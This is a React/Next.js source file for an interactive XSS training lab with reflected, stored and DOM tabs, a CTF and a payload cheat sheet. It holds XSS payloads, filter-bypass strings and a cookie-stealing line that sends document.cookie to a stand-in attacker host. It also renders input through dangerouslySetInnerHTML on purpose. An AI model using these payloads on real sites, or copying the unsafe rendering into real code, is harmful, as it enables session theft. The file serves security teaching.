"use client";

import { useState, useEffect, useRef } from "react";
import Link from "next/link";
import {
  Terminal,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Flame,
  Bug,
  RefreshCw,
  Server,
  FileCode,
  Award,
  Play,
  Copy,
  Check,
  Send,
  Eye,
  AlertTriangle,
  Sparkles,
  Bot,
  UserCheck,
  Zap,
  Info,
} from "lucide-react";
import confetti from "canvas-confetti";
import SecurityAlertModal, { SimulatedAlert } from "@/components/SecurityAlertModal";
import HackerMonitor, { SecurityLogEvent } from "@/components/HackerMonitor";

export default function TestLabPage() {
  const [activeTab, setActiveTab] = useState<"reflected" | "stored" | "dom" | "contexts" | "ctf" | "cheatsheet">("reflected");
  
  // Security Modal Alert
  const [currentAlert, setCurrentAlert] = useState<SimulatedAlert | null>(null);

  // Security Logs & Mock C2 State
  const [events, setEvents] = useState<SecurityLogEvent[]>([]);
  const [mockCookies, setMockCookies] = useState<Record<string, string>>({
    session_id: "sess_98a7df8a9f8e7b6c5d4e",
    user_role: "editor_standard",
    csrf_token: "csrf_token_secret_8492048",
  });
  const [mockStorage, setMockStorage] = useState<Record<string, string>>({
    jwt_auth: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJhZG1pbiI6dHJ1ZX0",
    theme_preference: "dark_cyber",
    last_visited_route: "/admin/finance",
  });

  // Global trigger simulated XSS alert
  const triggerSimulatedXss = (message: string, source: string, context: string, payload: string) => {
    const alertObj: SimulatedAlert = {
      id: Math.random().toString(),
      message: message || "1",
      source,
      context,
      payload,
      timestamp: new Date().toLocaleTimeString(),
    };
    setCurrentAlert(alertObj);

    // Log to Monitor
    const newLog: SecurityLogEvent = {
      id: Math.random().toString(),
      time: new Date().toLocaleTimeString(),
      type: "CRITICAL_XSS",
      title: `XSS Executed via ${source}`,
      details: `Malicious JavaScript executed in ${context} context. Injected code parsed by client browser.`,
      payload,
      stolenData: {
        cookie: mockCookies.session_id ? `session_id=${mockCookies.session_id}` : undefined,
        token: mockStorage.jwt_auth,
      },
    };
    setEvents((prev) => [newLog, ...prev]);
  };

  const triggerDefenseBlocked = (source: string, details: string, payload: string) => {
    const newLog: SecurityLogEvent = {
      id: Math.random().toString(),
      time: new Date().toLocaleTimeString(),
      type: "DEFENSE_BLOCKED",
      title: `Attack Blocked / Escaped (${source})`,
      details,
      payload,
    };
    setEvents((prev) => [newLog, ...prev]);
  };

  // ==================== SCENARIO 1: REFLECTED XSS ====================
  const [reflectedQuery, setReflectedQuery] = useState<string>("<script>alert('Reflected XSS')</script>");
  const [reflectedFilter, setReflectedFilter] = useState<"vulnerable" | "weak_blacklist" | "secure">("vulnerable");
  const [renderedReflectedHtml, setRenderedReflectedHtml] = useState<string>("");
  const reflectedPreviewRef = useRef<HTMLDivElement>(null);

  const handleReflectedSearch = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    let output = reflectedQuery;

    if (reflectedFilter === "vulnerable") {
      output = reflectedQuery;
      // Execute simulation check
      if (
        reflectedQuery.includes("<script") ||
        reflectedQuery.includes("onerror=") ||
        reflectedQuery.includes("onload=") ||
        reflectedQuery.includes("javascript:")
      ) {
        triggerSimulatedXss("Reflected XSS Executed", "Reflected Search Query", "HTML Response Body", reflectedQuery);
      }
    } else if (reflectedFilter === "weak_blacklist") {
      // Naive filter: replaces exact lowercase <script> and </script>
      const stripped = reflectedQuery.replace(/<script>/gi, "").replace(/<\/script>/gi, "");
      output = stripped;
      
      // If bypass used (e.g. <img onerror=...>, <svg onload=...>, <SCR<script>IPT>, etc.)
      if (
        stripped.includes("onerror=") ||
        stripped.includes("onload=") ||
        stripped.toLowerCase().includes("<script")
      ) {
        triggerSimulatedXss("Weak Filter Bypassed!", "Weak Blacklist Bypass", "HTML Response Body", reflectedQuery);
      } else {
        triggerDefenseBlocked("Weak Blacklist", "Exact <script> tag was stripped, but vector lacked execution.", reflectedQuery);
      }
    } else if (reflectedFilter === "secure") {
      // HTML Entity Encoding
      output = reflectedQuery
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
      triggerDefenseBlocked("Secure HTML Encoding", "Characters < > \" ' were converted to safe HTML entities.", reflectedQuery);
    }

    setRenderedReflectedHtml(output);
  };

  // Run initial reflected render on mount
  useEffect(() => {
    handleReflectedSearch();
  }, [reflectedFilter]);

  // ==================== SCENARIO 2: STORED XSS ====================
  interface GuestbookComment {
    id: string;
    author: string;
    message: string;
    time: string;
    isVulnerable: boolean;
  }

  const [comments, setComments] = useState<GuestbookComment[]>([
    {
      id: "1",
      author: "Alice (Staff)",
      message: "Welcome to the corporate guestbook! Please share your feedback.",
      time: "10:15 AM",
      isVulnerable: false,
    },
    {
      id: "2",
      author: "Bob (Dev)",
      message: "The new UI looks very slick and responsive!",
      time: "10:42 AM",
      isVulnerable: false,
    },
  ]);
  const [commentAuthor, setCommentAuthor] = useState<string>("Attacker_X");
  const [commentMessage, setCommentMessage] = useState<string>("<img src=x onerror=alert('Stored Admin Pwned!')>");
  const [storedMode, setStoredMode] = useState<"vulnerable" | "sanitized">("vulnerable");
  const [adminVisiting, setAdminVisiting] = useState<boolean>(false);

  const handlePostComment = (e: React.FormEvent) => {
    e.preventDefault();
    if (!commentMessage.trim()) return;

    const newComment: GuestbookComment = {
      id: Math.random().toString(),
      author: commentAuthor || "Anonymous",
      message: storedMode === "vulnerable"
        ? commentMessage
        : commentMessage.replace(/</g, "&lt;").replace(/>/g, "&gt;"),
      time: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }),
      isVulnerable: storedMode === "vulnerable",
    };

    setComments((prev) => [...prev, newComment]);

    // Check if immediate preview execution
    if (storedMode === "vulnerable" && (commentMessage.includes("onerror") || commentMessage.includes("<script") || commentMessage.includes("onload"))) {
      triggerSimulatedXss("Stored XSS Saved to Database", "Persistent Guestbook Feed", "Database / InnerHTML", commentMessage);
    }
  };

  const simulateAdminBotVisit = () => {
    setAdminVisiting(true);
    setTimeout(() => {
      // Find if any vulnerable comment exists
      const vulnerableComment = comments.find((c) => c.isVulnerable && (c.message.includes("<script") || c.message.includes("onerror") || c.message.includes("onload")));

      if (vulnerableComment) {
        // Admin compromised!
        const adminLog: SecurityLogEvent = {
          id: Math.random().toString(),
          time: new Date().toLocaleTimeString(),
          type: "COOKIE_STEAL",
          title: "🚨 Victim Admin Bot Compromised by Stored XSS!",
          details: `Simulated Admin visited the guestbook. Stored script executed inside Admin session and stole Admin JWT Token!`,
          payload: vulnerableComment.message,
          stolenData: {
            cookie: "admin_master_session=ADMIN_SUPER_KEY_99923847293",
            token: "admin_jwt_secret_token_LEVEL_5_ACCESS",
          },
        };
        setEvents((prev) => [adminLog, ...prev]);
        triggerSimulatedXss("Admin Bot Compromised: document.cookie Exfiltrated!", "Stored Guestbook XSS", "Victim Admin Browser Session", vulnerableComment.message);
      } else {
        triggerDefenseBlocked("Admin Bot Visit", "Admin viewed the comments. All comments were sanitized; no script execution occurred.", "Safe Feed");
      }
      setAdminVisiting(false);
    }, 1200);
  };

  // ==================== SCENARIO 3: DOM XSS ====================
  const [domHashInput, setDomHashInput] = useState<string>("default_user");
  const [domSinkType, setDomSinkType] = useState<"innerHTML" | "eval" | "location_href" | "textContent">("innerHTML");
  const [domOutput, setDomOutput] = useState<string>("");

  const handleExecuteDomSink = () => {
    if (domSinkType === "innerHTML") {
      setDomOutput(domHashInput);
      if (domHashInput.includes("<img") || domHashInput.includes("onerror=") || domHashInput.includes("<svg") || domHashInput.includes("<script")) {
        triggerSimulatedXss("DOM XSS via element.innerHTML", "Source: location.hash", "Sink: element.innerHTML", domHashInput);
      }
    } else if (domSinkType === "eval") {
      setDomOutput(`eval("${domHashInput}")`);
      if (domHashInput.includes("alert") || domHashInput.includes("console")) {
        triggerSimulatedXss("DOM XSS via eval()", "Source: location.search", "Sink: eval()", domHashInput);
      }
    } else if (domSinkType === "location_href") {
      setDomOutput(`location.href = "${domHashInput}"`);
      if (domHashInput.toLowerCase().startsWith("javascript:")) {
        triggerSimulatedXss("DOM XSS via javascript: URI", "Source: window.name", "Sink: location.href", domHashInput);
      }
    } else if (domSinkType === "textContent") {
      setDomOutput(domHashInput);
      triggerDefenseBlocked("Safe Sink: textContent", "textContent treats all input as plain text without parsing HTML tags.", domHashInput);
    }
  };

  // ==================== SCENARIO 4: CONTEXT MATRIX ====================
  const [contextInput, setContextInput] = useState<string>("\"><script>alert('Pwned')</script>");

  // ==================== SCENARIO 5: 5-LEVEL CTF ====================
  interface CTFLevel {
    id: number;
    title: string;
    category: string;
    goal: string;
    hint: string;
    defaultInput: string;
    solution: string;
    validator: (input: string) => boolean;
  }

  const ctfLevels: CTFLevel[] = [
    {
      id: 1,
      title: "Level 1: The Classic Tag Trigger",
      category: "Reflected XSS",
      goal: "Inject a basic script or image event payload into the search input to trigger an alert execution.",
      hint: "Use <script>alert(1)</script> or <img src=x onerror=alert(1)>.",
      defaultInput: "shoes",
      solution: "<script>alert(1)</script>",
      validator: (val) => val.includes("<script>alert(") || val.includes("onerror=alert("),
    },
    {
      id: 2,
      title: "Level 2: The Regex Blacklist Bypass",
      category: "Filter Evasion",
      goal: "The server strips `<script>` tags using a naive filter. Trigger an alert without using `<script>` tags.",
      hint: "Event handlers on other HTML tags (like <img> or <svg>) are not affected by <script> blacklists!",
      defaultInput: "search query",
      solution: "<img src=x onerror=alert(1)>",
      validator: (val) => (val.includes("onerror=") || val.includes("onload=")) && !val.includes("<script>"),
    },
    {
      id: 3,
      title: "Level 3: Attribute Quote Escape",
      category: "Attribute Context",
      goal: "Your input is placed inside an attribute: `<input value=\"YOUR_INPUT\">`. Escape the quotes and inject an event handler.",
      hint: "Close the quote with `\"` then add an autofocus handler or close the tag with `\"><img ...>`.",
      defaultInput: "test",
      solution: "\" onfocus=\"alert(1)\" autofocus=\"",
      validator: (val) => (val.startsWith("\"") || val.includes("\">")) && (val.includes("on") || val.includes("alert")),
    },
    {
      id: 4,
      title: "Level 4: The JavaScript Protocol Hijack",
      category: "URI Context",
      goal: "A website creates a dynamic link: `<a href=\"YOUR_INPUT\">Click Here</a>`. Execute JavaScript when clicked.",
      hint: "Browsers treat the `javascript:` pseudo-protocol as executable code inside href attributes.",
      defaultInput: "https://google.com",
      solution: "javascript:alert(document.domain)",
      validator: (val) => val.toLowerCase().startsWith("javascript:") && val.includes("alert"),
    },
    {
      id: 5,
      title: "Level 5: Mock Token Exfiltration",
      category: "Advanced Payload",
      goal: "Exfiltrate the mock session cookie to the hacker monitor by referencing `document.cookie`.",
      hint: "Trigger an alert containing `document.cookie` or call the mock exfil function.",
      defaultInput: "",
      solution: "<img src=x onerror=alert(document.cookie)>",
      validator: (val) => val.includes("document.cookie") && (val.includes("alert") || val.includes("onerror")),
    },
  ];

  const [currentCtfLevel, setCurrentCtfLevel] = useState<number>(1);
  const [ctfInput, setCtfInput] = useState<string>(ctfLevels[0].defaultInput);
  const [completedLevels, setCompletedLevels] = useState<number[]>([]);
  const [showHint, setShowHint] = useState<boolean>(false);
  const [showSolution, setShowSolution] = useState<boolean>(false);

  const handleTestCtf = () => {
    const level = ctfLevels.find((l) => l.id === currentCtfLevel);
    if (!level) return;

    if (level.validator(ctfInput)) {
      if (!completedLevels.includes(currentCtfLevel)) {
        setCompletedLevels((prev) => [...prev, currentCtfLevel]);
        confetti({
          particleCount: 80,
          spread: 70,
          origin: { y: 0.6 },
        });
      }
      triggerSimulatedXss(`CTF Level ${currentCtfLevel} Solved!`, `CTF Arena (${level.category})`, "CTF Sandbox", ctfInput);
    } else {
      triggerDefenseBlocked("CTF Validator", "Payload did not satisfy level objectives. Check the hint!", ctfInput);
    }
  };

  const handleSelectCtfLevel = (lvlId: number) => {
    setCurrentCtfLevel(lvlId);
    const lvl = ctfLevels.find((l) => l.id === lvlId);
    if (lvl) {
      setCtfInput(lvl.defaultInput);
      setShowHint(false);
      setShowSolution(false);
    }
  };

  // Cheat Sheet Payloads
  const cheatSheetPayloads = [
    { title: "Standard Script Alert", code: "<script>alert(1)</script>", cat: "Classic" },
    { title: "Image Error Handler", code: "<img src=x onerror=alert('XSS')>", cat: "Event Handlers" },
    { title: "SVG Auto-loader", code: "<svg onload=alert(1)>", cat: "Vector" },
    { title: "JavaScript URI Protocol", code: "javascript:alert(document.cookie)", cat: "URI" },
    { title: "Body Onload Trigger", code: "<body onload=alert('Pwned')>", cat: "Event Handlers" },
    { title: "Attribute Quote Escape", code: "\" onfocus=\"alert(1)\" autofocus=\"", cat: "Attribute" },
    { title: "Nested Script Bypass", code: "<scr<script>ipt>alert(1)</script>", cat: "Filter Evasion" },
    { title: "Case-Insensitive Bypass", code: "<sCrIpt>alert(1)</ScRiPt>", cat: "Filter Evasion" },
    { title: "Cookie Stealing Payload", code: "<img src=x onerror=fetch('https://c2.attacker.com/steal?c='+document.cookie)>", cat: "Exfiltration" },
    { title: "DOM Token Grabber", code: "<svg onload=\"alert(sessionStorage.jwt)\">", cat: "Exfiltration" },
  ];

  const injectCheatSheetPayload = (code: string) => {
    if (activeTab === "reflected") {
      setReflectedQuery(code);
    } else if (activeTab === "stored") {
      setCommentMessage(code);
    } else if (activeTab === "dom") {
      setDomHashInput(code);
    } else if (activeTab === "ctf") {
      setCtfInput(code);
    }
  };

  return (
    <div className="container" style={{ padding: "2.5rem 1.5rem" }}>
      {/* Visual Interceptor Alert Modal */}
      <SecurityAlertModal alert={currentAlert} onClose={() => setCurrentAlert(null)} />

      {/* Top Header */}
      <div style={{ display: "flex", flexWrap: "wrap", justifyContent: "space-between", alignItems: "flex-end", gap: "1rem", marginBottom: "2rem" }}>
        <div>
          <div className="badge badge-rose" style={{ marginBottom: "0.5rem" }}>
            Live Testing & Exploitation Sandbox
          </div>
          <h1 style={{ fontSize: "2.25rem", margin: 0, color: "#fff" }}>Interactive XSS Laboratory</h1>
          <p style={{ color: "var(--text-secondary)", fontSize: "0.95rem", margin: "0.25rem 0 0 0" }}>
            Test injection payloads across Reflected, Stored, DOM sinks, and CTF challenges in an isolated, monitored client environment.
          </p>
        </div>

        {/* Action Link to Docs */}
        <div style={{ display: "flex", gap: "0.75rem" }}>
          <Link href="/docs" className="btn btn-outline btn-sm">
            <Shield size={14} />
            <span>View Defenses Guide</span>
          </Link>
        </div>
      </div>

      {/* Lab Mode Navigation Tabs */}
      <div style={{
        display: "flex",
        flexWrap: "wrap",
        gap: "0.5rem",
        marginBottom: "2rem",
        padding: "0.4rem",
        background: "rgba(15, 23, 42, 0.6)",
        borderRadius: "var(--radius-lg)",
        border: "1px solid var(--border-subtle)"
      }}>
        {[
          { key: "reflected", label: "1. Reflected XSS Sandbox", icon: RefreshCw },
          { key: "stored", label: "2. Stored Guestbook & Admin Bot", icon: Server },
          { key: "dom", label: "3. DOM Sinks & Sources", icon: FileCode },
          { key: "contexts", label: "4. Context Matrix", icon: Bug },
          { key: "ctf", label: `5. CTF Arena (${completedLevels.length}/5)`, icon: Award, highlight: true },
          { key: "cheatsheet", label: "Payload Cheat Sheet", icon: Zap },
        ].map((tab) => {
          const Icon = tab.icon;
          const isActive = activeTab === tab.key;
          return (
            <button
              key={tab.key}
              onClick={() => setActiveTab(tab.key as any)}
              style={{
                display: "flex",
                alignItems: "center",
                gap: "0.5rem",
                padding: "0.6rem 1rem",
                borderRadius: "var(--radius-md)",
                border: "none",
                background: isActive ? "rgba(16, 185, 129, 0.2)" : "transparent",
                color: isActive ? "var(--accent-emerald)" : "var(--text-secondary)",
                fontWeight: 600,
                fontSize: "0.85rem",
                cursor: "pointer",
                transition: "all 0.2s ease"
              }}
            >
              <Icon size={16} />
              <span>{tab.label}</span>
            </button>
          );
        })}
      </div>

      {/* 2-Column Layout: Sandbox on Left, Hacker Monitor on Right */}
      <div style={{ display: "grid", gridTemplateColumns: "1fr 420px", gap: "2rem", alignItems: "start" }}>
        
        {/* LEFT COLUMN: ACTIVE SANDBOX */}
        <div style={{ display: "flex", flexDirection: "column", gap: "1.5rem" }}>
          
          {/* ================= TAB 1: REFLECTED XSS ================= */}
          {activeTab === "reflected" && (
            <div className="glass-panel" style={{ padding: "1.75rem" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1rem" }}>
                <div>
                  <h3 style={{ fontSize: "1.3rem", color: "#fff", margin: 0 }}>Reflected Search Query Lab</h3>
                  <p style={{ fontSize: "0.8rem", color: "var(--text-muted)", margin: 0 }}>
                    Simulates a server reflecting untrusted URL search parameters into the HTML response.
                  </p>
                </div>
                <span className="badge badge-amber">Reflected Vector</span>
              </div>

              {/* Filter mode switcher */}
              <div style={{
                background: "rgba(2, 6, 23, 0.8)",
                border: "1px solid var(--border-subtle)",
                borderRadius: "var(--radius-md)",
                padding: "0.75rem 1rem",
                marginBottom: "1.25rem",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                flexWrap: "wrap",
                gap: "0.5rem"
              }}>
                <span style={{ fontSize: "0.8rem", color: "var(--text-secondary)", fontWeight: 600 }}>
                  Server Defense Filter:
                </span>
                <div style={{ display: "flex", gap: "0.4rem" }}>
                  {[
                    { key: "vulnerable", label: "Vulnerable (Raw)", color: "badge-rose" },
                    { key: "weak_blacklist", label: "Weak Blacklist (<script>)", color: "badge-amber" },
                    { key: "secure", label: "Secure (HTML Escaped)", color: "badge-emerald" },
                  ].map((f) => (
                    <button
                      key={f.key}
                      onClick={() => setReflectedFilter(f.key as any)}
                      className={`badge ${f.color}`}
                      style={{
                        cursor: "pointer",
                        opacity: reflectedFilter === f.key ? 1 : 0.45,
                        transform: reflectedFilter === f.key ? "scale(1.05)" : "none",
                        border: reflectedFilter === f.key ? "1px solid #fff" : "1px solid transparent"
                      }}
                    >
                      {f.label}
                    </button>
                  ))}
                </div>
              </div>

              {/* Search Form */}
              <form onSubmit={handleReflectedSearch} style={{ display: "flex", gap: "0.75rem", marginBottom: "1.25rem" }}>
                <input
                  type="text"
                  value={reflectedQuery}
                  onChange={(e) => setReflectedQuery(e.target.value)}
                  placeholder="Enter search query or payload..."
                  className="input-field input-field-mono"
                  style={{ flex: 1 }}
                />
                <button type="submit" className="btn btn-primary">
                  <Play size={16} />
                  <span>Execute</span>
                </button>
              </form>

              {/* Sample Payload Quick Buttons */}
              <div style={{ display: "flex", flexWrap: "wrap", gap: "0.4rem", marginBottom: "1.5rem" }}>
                {[
                  { label: "Classic Script", val: "<script>alert('Reflected XSS')</script>" },
                  { label: "Image OnError", val: "<img src=x onerror=alert('Image Reflected')>" },
                  { label: "Bypass Blacklist", val: "<scr<script>ipt>alert(1)</script>" },
                  { label: "SVG Vector", val: "<svg onload=alert('SVG Pwn')>" },
                ].map((btn) => (
                  <button
                    key={btn.label}
                    type="button"
                    onClick={() => {
                      setReflectedQuery(btn.val);
                    }}
                    className="btn btn-outline btn-sm"
                    style={{ fontSize: "0.72rem" }}
                  >
                    {btn.label}
                  </button>
                ))}
              </div>

              {/* Simulated Server Response Box */}
              <div>
                <div style={{ fontSize: "0.75rem", color: "var(--text-muted)", marginBottom: "0.4rem", fontWeight: 600 }}>
                  Simulated Server Response HTML:
                </div>
                <div style={{
                  padding: "1.25rem",
                  background: "rgba(2, 6, 23, 0.9)",
                  border: "1px solid var(--border-medium)",
                  borderRadius: "var(--radius-md)",
                  minHeight: "80px"
                }}>
                  <div style={{ fontSize: "0.85rem", color: "var(--text-secondary)", marginBottom: "0.5rem" }}>
                    Showing results for:
                  </div>
                  {/* Visual Render */}
                  <div
                    style={{ fontSize: "1.1rem", fontWeight: 700, color: "#fff" }}
                    dangerouslySetInnerHTML={{ __html: renderedReflectedHtml }}
                  />
                </div>
              </div>
            </div>
          )}

          {/* ================= TAB 2: STORED XSS ================= */}
          {activeTab === "stored" && (
            <div className="glass-panel" style={{ padding: "1.75rem" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1rem" }}>
                <div>
                  <h3 style={{ fontSize: "1.3rem", color: "#fff", margin: 0 }}>Persistent Guestbook & Victim Bot</h3>
                  <p style={{ fontSize: "0.8rem", color: "var(--text-muted)", margin: 0 }}>
                    Stored payloads are saved in local state and executed whenever any user (or the Admin Bot) visits.
                  </p>
                </div>
                <span className="badge badge-rose">Stored Vector</span>
              </div>

              {/* Bot Simulation Action Banner */}
              <div style={{
                background: "linear-gradient(135deg, rgba(244, 63, 94, 0.12), rgba(139, 92, 246, 0.12))",
                border: "1px solid rgba(244, 63, 94, 0.3)",
                borderRadius: "var(--radius-md)",
                padding: "1rem",
                marginBottom: "1.5rem",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                flexWrap: "wrap",
                gap: "1rem"
              }}>
                <div style={{ display: "flex", alignItems: "center", gap: "0.6rem" }}>
                  <Bot size={24} color="var(--accent-rose)" />
                  <div>
                    <h4 style={{ fontSize: "0.95rem", color: "#fff", margin: 0 }}>Simulated Victim Admin Bot</h4>
                    <p style={{ fontSize: "0.75rem", color: "var(--text-muted)", margin: 0 }}>
                      The Admin bot carries a sensitive <code>admin_jwt_secret_token</code> in their session.
                    </p>
                  </div>
                </div>

                <button
                  onClick={simulateAdminBotVisit}
                  disabled={adminVisiting}
                  className="btn btn-danger btn-sm"
                >
                  <Eye size={14} />
                  <span>{adminVisiting ? "Admin Visiting..." : "Trigger Admin Bot Visit"}</span>
                </button>
              </div>

              {/* Post Comment Form */}
              <form onSubmit={handlePostComment} style={{ marginBottom: "1.5rem", display: "flex", flexDirection: "column", gap: "0.75rem" }}>
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "0.75rem" }}>
                  <div>
                    <label style={{ fontSize: "0.75rem", color: "var(--text-muted)", display: "block", marginBottom: "0.2rem" }}>Author:</label>
                    <input
                      type="text"
                      value={commentAuthor}
                      onChange={(e) => setCommentAuthor(e.target.value)}
                      className="input-field"
                    />
                  </div>
                  <div>
                    <label style={{ fontSize: "0.75rem", color: "var(--text-muted)", display: "block", marginBottom: "0.2rem" }}>Storage Mode:</label>
                    <select
                      value={storedMode}
                      onChange={(e) => setStoredMode(e.target.value as any)}
                      className="input-field"
                    >
                      <option value="vulnerable">Vulnerable (Unescaped Database)</option>
                      <option value="sanitized">Sanitized (HTML Encoded)</option>
                    </select>
                  </div>
                </div>

                <div>
                  <label style={{ fontSize: "0.75rem", color: "var(--text-muted)", display: "block", marginBottom: "0.2rem" }}>Comment Payload:</label>
                  <textarea
                    value={commentMessage}
                    onChange={(e) => setCommentMessage(e.target.value)}
                    rows={2}
                    className="input-field input-field-mono"
                  />
                </div>

                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <div style={{ display: "flex", gap: "0.4rem" }}>
                    <button
                      type="button"
                      onClick={() => setCommentMessage("<img src=x onerror=alert('Stored XSS Exfiltrated!')>")}
                      className="btn btn-outline btn-sm"
                      style={{ fontSize: "0.7rem" }}
                    >
                      Image Payload
                    </button>
                    <button
                      type="button"
                      onClick={() => setCommentMessage("<script>alert(document.cookie)</script>")}
                      className="btn btn-outline btn-sm"
                      style={{ fontSize: "0.7rem" }}
                    >
                      Cookie Stealer
                    </button>
                  </div>

                  <button type="submit" className="btn btn-primary btn-sm">
                    <Send size={14} />
                    <span>Submit to Database</span>
                  </button>
                </div>
              </form>

              {/* Guestbook Feed */}
              <div>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "0.5rem" }}>
                  <span style={{ fontSize: "0.85rem", fontWeight: 700, color: "#fff" }}>Guestbook Comments ({comments.length})</span>
                  <button
                    onClick={() => setComments([])}
                    style={{ background: "none", border: "none", color: "var(--text-muted)", fontSize: "0.72rem", cursor: "pointer" }}
                  >
                    Clear Feed
                  </button>
                </div>

                <div style={{ display: "flex", flexDirection: "column", gap: "0.6rem" }}>
                  {comments.map((c) => (
                    <div
                      key={c.id}
                      style={{
                        padding: "0.85rem",
                        background: "rgba(2, 6, 23, 0.7)",
                        border: "1px solid var(--border-subtle)",
                        borderRadius: "var(--radius-md)",
                      }}
                    >
                      <div style={{ display: "flex", justifyContent: "space-between", fontSize: "0.75rem", color: "var(--text-muted)", marginBottom: "0.3rem" }}>
                        <span style={{ fontWeight: 700, color: "var(--accent-cyan)" }}>{c.author}</span>
                        <span>{c.time}</span>
                      </div>
                      <div
                        style={{ fontSize: "0.9rem", color: "#fff" }}
                        dangerouslySetInnerHTML={{ __html: c.message }}
                      />
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* ================= TAB 3: DOM XSS ================= */}
          {activeTab === "dom" && (
            <div className="glass-panel" style={{ padding: "1.75rem" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1rem" }}>
                <div>
                  <h3 style={{ fontSize: "1.3rem", color: "#fff", margin: 0 }}>DOM-Based Sinks & Sources Explorer</h3>
                  <p style={{ fontSize: "0.8rem", color: "var(--text-muted)", margin: 0 }}>
                    Examine how dangerous client-side JavaScript APIs parse data from untrusted DOM sources.
                  </p>
                </div>
                <span className="badge badge-cyan">DOM Vector</span>
              </div>

              {/* Source & Sink Controls */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1rem", marginBottom: "1.25rem" }}>
                <div>
                  <label style={{ fontSize: "0.75rem", color: "var(--text-muted)", display: "block", marginBottom: "0.2rem" }}>
                    Untrusted Source (Simulated `location.hash`):
                  </label>
                  <input
                    type="text"
                    value={domHashInput}
                    onChange={(e) => setDomHashInput(e.target.value)}
                    className="input-field input-field-mono"
                  />
                </div>

                <div>
                  <label style={{ fontSize: "0.75rem", color: "var(--text-muted)", display: "block", marginBottom: "0.2rem" }}>
                    Target Execution Sink:
                  </label>
                  <select
                    value={domSinkType}
                    onChange={(e) => setDomSinkType(e.target.value as any)}
                    className="input-field"
                  >
                    <option value="innerHTML">element.innerHTML (Dangerous Sink)</option>
                    <option value="eval">eval(input) (Dangerous Sink)</option>
                    <option value="location_href">location.href = input (Dangerous Sink)</option>
                    <option value="textContent">element.textContent (Safe Sink)</option>
                  </select>
                </div>
              </div>

              <button onClick={handleExecuteDomSink} className="btn btn-cyan btn-sm" style={{ marginBottom: "1.5rem" }}>
                <Play size={14} />
                <span>Execute Sink Flow</span>
              </button>

              {/* Execution Flow Box */}
              <div className="code-box">
                <div className="code-box-header">
                  <span>Data Flow Analysis</span>
                </div>
                <div style={{ color: "var(--text-secondary)", fontSize: "0.82rem" }}>
                  <div>1. <strong>Source:</strong> <code>window.location.hash = &quot;{domHashInput}&quot;</code></div>
                  <div>2. <strong>Flow:</strong> Untrusted string passed directly to client function.</div>
                  <div>3. <strong>Sink:</strong> <code>{domSinkType === "innerHTML" ? "element.innerHTML = hash" : domSinkType === "eval" ? `eval("${domHashInput}")` : domSinkType === "location_href" ? `location.href = "${domHashInput}"` : "element.textContent = hash"}</code></div>
                </div>
              </div>
            </div>
          )}

          {/* ================= TAB 4: CONTEXT MATRIX ================= */}
          {activeTab === "contexts" && (
            <div className="glass-panel" style={{ padding: "1.75rem" }}>
              <div style={{ marginBottom: "1.25rem" }}>
                <h3 style={{ fontSize: "1.3rem", color: "#fff", margin: 0 }}>Injection Context Matrix</h3>
                <p style={{ fontSize: "0.8rem", color: "var(--text-muted)", margin: "0.2rem 0 0 0" }}>
                  Observe how the exact same payload behaves when rendered into 4 different HTML and JavaScript contexts.
                </p>
              </div>

              <div style={{ marginBottom: "1.5rem" }}>
                <label style={{ fontSize: "0.78rem", color: "var(--text-secondary)", fontWeight: 600, display: "block", marginBottom: "0.3rem" }}>
                  Global Injection Input:
                </label>
                <input
                  type="text"
                  value={contextInput}
                  onChange={(e) => setContextInput(e.target.value)}
                  className="input-field input-field-mono"
                />
              </div>

              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1rem" }}>
                {/* Context 1: Body */}
                <div className="code-box">
                  <div className="code-box-header">
                    <span style={{ color: "var(--accent-emerald)" }}>1. HTML Body Context</span>
                  </div>
                  <div style={{ fontSize: "0.75rem", color: "var(--text-muted)", marginBottom: "0.4rem" }}>
                    <code>&lt;div&gt;{contextInput}&lt;/div&gt;</code>
                  </div>
                  <div style={{ color: "#34d399" }}>
                    {contextInput.includes("<script") || contextInput.includes("<img") ? "⚠️ VULNERABLE: Parsed as HTML elements" : "Safe text string"}
                  </div>
                </div>

                {/* Context 2: Attribute */}
                <div className="code-box">
                  <div className="code-box-header">
                    <span style={{ color: "var(--accent-cyan)" }}>2. Attribute Value Context</span>
                  </div>
                  <div style={{ fontSize: "0.75rem", color: "var(--text-muted)", marginBottom: "0.4rem" }}>
                    <code>&lt;input value=&quot;{contextInput}&quot;&gt;</code>
                  </div>
                  <div style={{ color: "#38bdf8" }}>
                    {contextInput.includes("\"") ? "⚠️ VULNERABLE: Breaks out of quote with \"" : "Escaped inside quotes"}
                  </div>
                </div>

                {/* Context 3: URI */}
                <div className="code-box">
                  <div className="code-box-header">
                    <span style={{ color: "var(--accent-amber)" }}>3. URI / Link Context</span>
                  </div>
                  <div style={{ fontSize: "0.75rem", color: "var(--text-muted)", marginBottom: "0.4rem" }}>
                    <code>&lt;a href=&quot;{contextInput}&quot;&gt;Click Me&lt;/a&gt;</code>
                  </div>
                  <div style={{ color: "#fbbf24" }}>
                    {contextInput.toLowerCase().startsWith("javascript:") ? "⚠️ VULNERABLE: javascript: protocol triggers on click" : "Standard URL"}
                  </div>
                </div>

                {/* Context 4: Script Variable */}
                <div className="code-box">
                  <div className="code-box-header">
                    <span style={{ color: "var(--accent-rose)" }}>4. JavaScript Variable Context</span>
                  </div>
